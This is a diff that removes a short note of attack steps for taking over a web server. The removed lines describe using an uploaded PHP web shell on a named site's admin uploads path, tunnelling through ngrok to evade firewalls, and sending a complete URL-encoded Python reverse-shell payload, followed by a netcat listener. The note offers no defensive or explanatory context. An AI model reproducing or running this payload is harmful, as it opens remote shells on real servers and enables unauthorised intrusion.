@@ -1,7 +1,0 @@
-1. use cmd.php to exec commands on web server
-2. search for reverse shell cheatseat and pick the command (oftenly theres an waf/ips/ids, connecting directly via netcat do not work for reverse shells)
-3. open nrgok in port 443 (ngrok TCP 443) => USE NGROKS PORT TOO => 15928
-4. copy link (0.tcp.ngrok.io) and use it as your ip adress
-	// http://www.bancocn.com/admin/uploads/cmd.php5?command=export%20RHOST=%220.tcp.sa.ngrok.io%22;export%20RPORT=15928;python%20-c%20%27import%20socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22/bin/sh%22)%27
-
-5. $ nc -lvp 443
